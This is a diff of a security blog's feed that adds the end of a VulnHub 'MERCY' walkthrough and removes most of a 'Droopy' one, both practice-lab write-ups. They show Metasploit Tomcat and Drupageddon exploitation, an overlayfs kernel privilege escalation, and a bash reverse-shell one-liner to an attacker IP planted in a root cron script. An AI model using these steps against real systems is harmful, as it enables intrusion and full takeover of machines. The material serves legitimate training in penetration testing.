+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; run
+</span><span class='line'>
+</span><span class='line'>[*] Started reverse TCP handler on 192.168.159.129:4444
+</span><span class='line'>[*] Retrieving session ID and CSRF token...
+</span><span class='line'>[*] Uploading and deploying oAsjCH3JZVzYcanqTIdZkOcn...
+</span><span class='line'>[*] Executing oAsjCH3JZVzYcanqTIdZkOcn...
+</span><span class='line'>[*] Undeploying oAsjCH3JZVzYcanqTIdZkOcn ...
+</span><span class='line'>[*] Sending stage (53844 bytes) to 192.168.159.137
+</span><span class='line'>[*] Meterpreter session 2 opened (192.168.159.129:4444 -&gt; 192.168.159.137:41182) at 2019-06-04 11:04:16 -0400
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I dropped into a shell and upgraded it to a proper terminal with <code>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</code>. From this shell, I was able to switch to user fluffy with the previously found password of <code>freakishfluffybunny</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
+</span><span class='line'>su fluffy
+</span><span class='line'>Password: freakishfluffybunny
+</span><span class='line'>
+</span><span class='line'>Added user fluffy.
+</span><span class='line'>$ python -c 'import pty; pty.spawn("/bin/bash")'
+</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
+</span><span class='line'>fluffy@MERCY:~$ ls -a
+</span><span class='line'>ls -a
+</span><span class='line'>.  ..  .bash_history  .private</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There are a few interesting files in fluffy&rsquo;s home:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>fluffy@MERCY:~/.private/secrets$ ls -a
+</span><span class='line'>ls -a
+</span><span class='line'>.  ..  backup.save  .secrets  timeclock</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The backup.save file is a shell script that just outputs a text:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat backup.save
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>
+</span><span class='line'>echo Backing Up Files;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In .secrets we have a Try harder! message. And the timeclock outputs the current date and time inside the web folder:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>luffy@MERCY:~/.private/secrets$ cat timeclock
+</span><span class='line'>cat timeclock
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>
+</span><span class='line'>now=$(date)
+</span><span class='line'>echo "The system time is: $now." &gt; ../../../../../var/www/html/time
+</span><span class='line'>echo "Time check courtesy of LINUX" &gt;&gt; ../../../../../var/www/html/time
+</span><span class='line'>chown www-data:www-data ../../../../../var/www/html/time</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This should be the local time reference from earlier. What&rsquo;s more interesting, this script is owned by root and everyone has full permissions on it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-rwxrwxrwx 1 root   root   222 Nov 20  2018 timeclock</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I appended a bash one-liner to the script to send me a shell: <code>bash -i >&amp; /dev/tcp/192.168.159.129/8888 0>&amp;1</code>. But if we just run the script, the shell will still be with fluffy&rsquo;s privileges. There should be a cron or something run by root. As I was investigating, I received a root shell on my listener!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@MERCY:~# ls /root
+</span><span class='line'>ls /root
+</span><span class='line'>author-secret.txt
+</span><span class='line'>config
+</span><span class='line'>proof.txt
+</span><span class='line'>root@MERCY:~# cat /root/proof.txt
+</span><span class='line'>cat /root/proof.txt
+</span><span class='line'>Congratulations on rooting MERCY. :-)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Indeed, cron was running the timeclock script every 3 minutes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>*/3 * * * * bash /home/fluffy/.private/secrets/timeclock</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the final flag and a message from the author:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@MERCY:~# cat author-secret.txt
+</span><span class='line'>cat author-secret.txt
+</span><span class='line'>Hi! Congratulations on being able to root MERCY.
+</span><span class='line'>
+</span><span class='line'>The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.
+</span><span class='line'>
+</span><span class='line'>The author would also like to thank a great friend who he always teases as "plead for mercy". She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author's rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.
+</span><span class='line'>
+</span><span class='line'>The author, as "plead for mercy" knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)
+</span><span class='line'>
+</span><span class='line'>You'll always be remembered, "plead for mercy", and Offensive Security, for making me plead for mercy!
+</span><span class='line'>
+</span><span class='line'>Congratulations, once again, for you TRIED HARDER!
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>The Author</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This was a nice box, the RIPS vector was definitely an interesting touch!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>_________________________________________
+</span><span class='line'>/ If your life was a horse, you'd have to \
+</span><span class='line'>\ shoot it.                               /
+</span><span class='line'>-----------------------------------------
+</span><span class='line'>           \   ^__^
+</span><span class='line'>              \  (oo)\_______
+</span><span class='line'>                   (__)\       )\/\
+</span><span class='line'>                           ||----w |
+</span><span class='line'>                           ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pond. Analoguepond]]></title>
@@ -7428,9 +8194,9 @@ file. There are no restrictions on the format of the secret data.</p></blockquot
 <p>The contact page gives us some names and mail addresses:</p>
 
 <ul>
-<li>Roger S. Michaels &ndash; <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#x72;&#109;&#x69;&#99;&#104;&#97;&#101;&#x6c;&#115;&#64;&#105;&#109;&#102;&#46;&#x6c;&#111;&#99;&#x61;&#x6c;">&#114;&#x6d;&#105;&#99;&#x68;&#x61;&#x65;&#108;&#115;&#x40;&#x69;&#x6d;&#102;&#x2e;&#108;&#111;&#99;&#97;&#108;</a></li>
-<li>Alexander B. Keith &ndash; <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#97;&#x6b;&#101;&#x69;&#116;&#104;&#64;&#105;&#109;&#102;&#46;&#108;&#111;&#99;&#x61;&#x6c;">&#x61;&#x6b;&#x65;&#x69;&#x74;&#x68;&#x40;&#105;&#109;&#x66;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;</a></li>
-<li>Elizabeth R. Stone &ndash; <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#101;&#x73;&#116;&#111;&#x6e;&#101;&#x40;&#x69;&#x6d;&#102;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;">&#x65;&#115;&#116;&#111;&#110;&#101;&#x40;&#105;&#x6d;&#102;&#x2e;&#x6c;&#111;&#x63;&#x61;&#108;</a></li>
+<li>Roger S. Michaels &ndash; <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#114;&#109;&#105;&#x63;&#x68;&#97;&#101;&#108;&#x73;&#64;&#105;&#x6d;&#102;&#46;&#x6c;&#x6f;&#x63;&#x61;&#108;">&#x72;&#109;&#x69;&#99;&#104;&#97;&#101;&#108;&#x73;&#64;&#105;&#x6d;&#102;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a></li>
+<li>Alexander B. Keith &ndash; <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#x61;&#x6b;&#x65;&#105;&#x74;&#x68;&#64;&#x69;&#x6d;&#102;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#x6c;">&#x61;&#x6b;&#x65;&#x69;&#x74;&#104;&#64;&#105;&#109;&#x66;&#46;&#x6c;&#x6f;&#99;&#x61;&#108;</a></li>
+<li>Elizabeth R. Stone &ndash; <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x65;&#115;&#x74;&#111;&#x6e;&#x65;&#64;&#105;&#x6d;&#x66;&#x2e;&#108;&#111;&#99;&#97;&#x6c;">&#101;&#x73;&#x74;&#x6f;&#110;&#101;&#x40;&#105;&#109;&#102;&#46;&#x6c;&#111;&#99;&#97;&#x6c;</a></li>
 </ul>
 
 
@@ -13641,681 +14407,6 @@ become viceroy over the Dead; but fails when tricked into passing the Ninth Gate
 </pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
 </span><span class='line'>/ Increased knowledge will help you now. \
 </span><span class='line'>\ Have mate's phone bugged.              /
-</span><span class='line'> ----------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Dropping Droopy]]></title>
-    <link href="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/"/>
-    <updated>2018-05-04T20:05:08+03:00</updated>
-    <id>http://chousensha.github.io/blog/2018/05/04/dropping-droopy</id>
-    <content type="html"><![CDATA[<p>I&rsquo;m back in the game with preparing for OSCP, and resuming the VulnHub machines. Today&rsquo;s target is Droopy. The author left 2 hints for this challenge:</p>
-
-<p>1.) Grab a copy of the rockyou wordlist.</p>
-
-<p>2.) It&rsquo;s fun to read other people&rsquo;s email.</p>
-
-<!-- more -->
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
-</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
-</span><span class='line'>|_http-generator: Drupal 7 (http://drupal.org)
-</span><span class='line'>| http-robots.txt: 36 disallowed entries (15 shown)
-</span><span class='line'>| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-</span><span class='line'>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-</span><span class='line'>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-</span><span class='line'>|_/LICENSE.txt /MAINTAINERS.txt
-</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
-</span><span class='line'>|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Looks like this will be a web-based challenge.</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/droopy.png" title="droopy" alt="droopy"></p>
-
-<p>There are quite a few entries inside robots.txt:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
-</span><span class='line'>Crawl-delay: 10
-</span><span class='line'># Directories
-</span><span class='line'>Disallow: /includes/
-</span><span class='line'>Disallow: /misc/
-</span><span class='line'>Disallow: /modules/
-</span><span class='line'>Disallow: /profiles/
-</span><span class='line'>Disallow: /scripts/
-</span><span class='line'>Disallow: /themes/
-</span><span class='line'># Files
-</span><span class='line'>Disallow: /CHANGELOG.txt
-</span><span class='line'>Disallow: /cron.php
-</span><span class='line'>Disallow: /INSTALL.mysql.txt
-</span><span class='line'>Disallow: /INSTALL.pgsql.txt
-</span><span class='line'>Disallow: /INSTALL.sqlite.txt
-</span><span class='line'>Disallow: /install.php
-</span><span class='line'>Disallow: /INSTALL.txt
-</span><span class='line'>Disallow: /LICENSE.txt
-</span><span class='line'>Disallow: /MAINTAINERS.txt
-</span><span class='line'>Disallow: /update.php
-</span><span class='line'>Disallow: /UPGRADE.txt
-</span><span class='line'>Disallow: /xmlrpc.php
-</span><span class='line'># Paths (clean URLs)
-</span><span class='line'>Disallow: /admin/
-</span><span class='line'>Disallow: /comment/reply/
-</span><span class='line'>Disallow: /filter/tips/
-</span><span class='line'>Disallow: /node/add/
-</span><span class='line'>Disallow: /search/
-</span><span class='line'>Disallow: /user/register/
-</span><span class='line'>Disallow: /user/password/
-</span><span class='line'>Disallow: /user/login/
-</span><span class='line'>Disallow: /user/logout/
-</span><span class='line'># Paths (no clean URLs)
-</span><span class='line'>Disallow: /?q=admin/
-</span><span class='line'>Disallow: /?q=comment/reply/
-</span><span class='line'>Disallow: /?q=filter/tips/
-</span><span class='line'>Disallow: /?q=node/add/
-</span><span class='line'>Disallow: /?q=search/
-</span><span class='line'>Disallow: /?q=user/password/
-</span><span class='line'>Disallow: /?q=user/register/
-</span><span class='line'>Disallow: /?q=user/login/
-</span><span class='line'>Disallow: /?q=user/logout/</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">Drupageddon</a>!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/drupal_drupageddon
-</span><span class='line'>msf exploit(drupal_drupageddon) &gt; info
-</span><span class='line'>
-</span><span class='line'>       Name: Drupal HTTP Parameter Key/Value SQL Injection
-</span><span class='line'>     Module: exploit/multi/http/drupal_drupageddon
-</span><span class='line'>   Platform: PHP
-</span><span class='line'>       Arch: php
-</span><span class='line'> Privileged: No
-</span><span class='line'>    License: Metasploit Framework License (BSD)
-</span><span class='line'>       Rank: Excellent
-</span><span class='line'>  Disclosed: 2014-10-15
-</span><span class='line'>
-</span><span class='line'>Provided by:
-</span><span class='line'>  SektionEins
-</span><span class='line'>  Christian Mehlmauer &lt;FireFart@gmail.com&gt;
-</span><span class='line'>  Brandon Perry
-</span><span class='line'>
-</span><span class='line'>Available targets:
-</span><span class='line'>  Id  Name
-</span><span class='line'>  --  ----
-</span><span class='line'>  0   Drupal 7.0 - 7.31
-</span><span class='line'>
-</span><span class='line'>Basic options:
-</span><span class='line'>  Name       Current Setting  Required  Description
-</span><span class='line'>  ----       ---------------  --------  -----------
-</span><span class='line'>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-</span><span class='line'>  RHOST      192.168.217.139  yes       The target address
-</span><span class='line'>  RPORT      80               yes       The target port (TCP)
-</span><span class='line'>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
-</span><span class='line'>  TARGETURI  /                yes       The target URI of the Drupal installation
-</span><span class='line'>  VHOST                       no        HTTP server virtual host
-</span><span class='line'>
-</span><span class='line'>Payload information:
-</span><span class='line'>
-</span><span class='line'>Description:
-</span><span class='line'>  This module exploits the Drupal HTTP Parameter Key/Value SQL 
-</span><span class='line'>  Injection (aka Drupageddon) in order to achieve a remote shell on 
-</span><span class='line'>  the vulnerable instance. This module was tested against Drupal 7.0 
-</span><span class='line'>  and 7.31 (was fixed in 7.32).
-</span><span class='line'>
-</span><span class='line'>References:
-</span><span class='line'>  https://cvedetails.com/cve/CVE-2014-3704/
-</span><span class='line'>  https://www.drupal.org/SA-CORE-2014-005
-</span><span class='line'>  http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
-</span><span class='line'>msf exploit(drupal_drupageddon) &gt; exploit
-</span><span class='line'>
-</span><span class='line'>[*] Started reverse TCP handler on 192.168.217.132:4444 
-</span><span class='line'>[*] Testing page
-</span><span class='line'>[*] Creating new user yCTZcwgtLV:WLhkIYdDtB
-</span><span class='line'>[*] Logging in as yCTZcwgtLV:WLhkIYdDtB
-</span><span class='line'>[*] Trying to parse enabled modules
-</span><span class='line'>[*] Enabling the PHP filter module
-</span><span class='line'>[*] Setting permissions for PHP filter module
-</span><span class='line'>[*] Getting tokens from create new article page
-</span><span class='line'>[*] Calling preview page. Exploit should trigger...
-</span><span class='line'>[*] Sending stage (37543 bytes) to 192.168.217.139
-</span><span class='line'>[*] Meterpreter session 1 opened (192.168.217.132:4444 -&gt; 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I dropped into a shell and checked the kernel version:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; shell
-</span><span class='line'>Process 1385 created.
-</span><span class='line'>Channel 0 created.
-</span><span class='line'>uname -a
-</span><span class='line'>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I ran the 3.13 version through the exploit check part of my <a href="https://github.com/chousensha/linux_privcheck">privcheck</a> script:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python linux_privcheck.py 
-</span><span class='line'>Kernel version is 3.13
-</span><span class='line'>###########################################
-</span><span class='line'>POTENTIALLY VULNERABLE TO
-</span><span class='line'>Name: Double-free usb-midi SMEP Local Privilege Escalation
-</span><span class='line'>CVE: CVE-2016-2384
-</span><span class='line'>Source code: https://www.exploit-db.com/exploits/41999/
-</span><span class='line'>###########################################
-</span><span class='line'>###########################################
-</span><span class='line'>POTENTIALLY VULNERABLE TO
-</span><span class='line'>Name: overlayfs Privilege Escalation
-</span><span class='line'>CVE: CVE-2015-1328
-</span><span class='line'>Source code: https://www.exploit-db.com/exploits/37292/
-</span><span class='line'>###########################################
-</span><span class='line'>###########################################
-</span><span class='line'>POTENTIALLY VULNERABLE TO
-</span><span class='line'>Name: ptrace/sysret Privilege Escalation
-</span><span class='line'>CVE: CVE-2014-4699
-</span><span class='line'>Source code: https://www.exploit-db.com/exploits/34134/
-</span><span class='line'>###########################################
-</span><span class='line'>###########################################
-</span><span class='line'>POTENTIALLY VULNERABLE TO
-</span><span class='line'>Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
-</span><span class='line'>CVE: N/A
-</span><span class='line'>Source code: https://www.exploit-db.com/exploits/38390/
-</span><span class='line'>###########################################
-</span><span class='line'>###########################################
-</span><span class='line'>POTENTIALLY VULNERABLE TO
-</span><span class='line'>Name: b43 Wireless Driver Privilege Escalation
-</span><span class='line'>CVE: CVE-2013-2852
-</span><span class='line'>Source code: https://www.exploit-db.com/exploits/38559/
-</span><span class='line'>###########################################
-</span><span class='line'>###########################################
-</span><span class='line'>POTENTIALLY VULNERABLE TO
-</span><span class='line'>Name: open-time Capability file_ns_capable() Privilege Escalation
-</span><span class='line'>CVE: CVE-2013-1959
-</span><span class='line'>Source code: https://www.exploit-db.com/exploits/25450/
-</span><span class='line'>###########################################</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; upload /root/37292.c /tmp/
-</span><span class='line'>[*] uploading  : /root/37292.c -&gt; /tmp/
-</span><span class='line'>[*] uploaded   : /root/37292.c -&gt; /tmp//37292.c</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>gcc 37292.c -o overlayfs
-</span><span class='line'>chmod +x overlayfs
-</span><span class='line'>./overlayfs
-</span><span class='line'>spawning threads
-</span><span class='line'>mount #1
-</span><span class='line'>mount #2
-</span><span class='line'>child threads done
-</span><span class='line'>/etc/ld.so.preload created
-</span><span class='line'>creating shared library
-</span><span class='line'>sh: 0: can't access tty; job control turned off
-</span><span class='line'># whoami
-</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
-
-
-<p>But the challenge is not over here. We are root, but remember the hints! We didn&rsquo;t get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># cat www-data
-</span><span class='line'>From Dave &lt;dave@droopy.example.com&gt; Wed Thu 14 Apr 04:34:39 2016
-</span><span class='line'>Date: 14 Apr 2016 04:34:39 +0100
-</span><span class='line'>From: Dave &lt;dave@droopy.example.com&gt;
-</span><span class='line'>Subject: rockyou with a nice hat!
-</span><span class='line'>Message-ID: &lt;730262568@example.com&gt;
-</span><span class='line'>X-IMAP: 0080081351 0000002016
-</span><span class='line'>Status: NN
-</span><span class='line'>
-</span><span class='line'>George,
-</span><span class='line'>
-</span><span class='line'>   I've updated the encrypted file... You didn't leave any
-</span><span class='line'>hints for me. The password isn't longer than 11 characters
-</span><span class='line'>and anyway, we know what academy we went to, don't you...?
-</span><span class='line'>
-</span><span class='line'>I'm sure you'll figure it out it won't rockyou too much!
-</span><span class='line'>
